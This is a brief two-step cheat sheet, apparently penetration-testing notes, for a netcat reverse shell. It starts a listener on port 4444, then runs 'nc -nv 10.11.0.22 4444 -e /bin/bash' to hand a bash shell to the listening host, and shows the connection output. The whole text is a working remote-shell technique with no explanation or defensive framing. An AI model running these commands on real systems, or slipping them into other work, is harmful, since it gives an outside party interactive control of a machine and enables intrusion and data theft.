# 1) spawn listener for remote shell
```sh
nc -nlvp 4444
```

# 2) send bash to remote attacker
```sh
nc -nv 10.11.0.22 4444 -e /bin/bash
...
(UNKNOWN) [10.11.0.22] 4444 (?) open
```
